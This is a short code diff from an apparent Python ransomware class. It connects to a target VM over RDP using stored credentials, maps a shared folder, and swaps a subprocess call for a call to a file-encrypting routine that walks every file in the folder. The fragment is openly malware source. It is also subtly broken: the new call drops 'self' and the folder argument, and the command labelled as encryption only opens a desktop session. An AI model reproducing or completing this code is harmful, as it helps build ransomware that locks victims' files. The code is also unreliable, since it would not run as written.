@@ -29,7 +29,7 @@ class Ransomware:
 
         # Encrypt files on the target VM
         encrypt_command = f'rdesktop {target_vm_ip} -u {rdp_username} -p {rdp_password} -r "disk:Shared={folder_path}" -a 16-bit -g 1024x768 -x l'
-        subprocess.run(encrypt_command, shell=True)
+        encrypt_folder()
 
     def encrypt_folder(self, folder_path):
         for root, dirs, files in os.walk(folder_path):
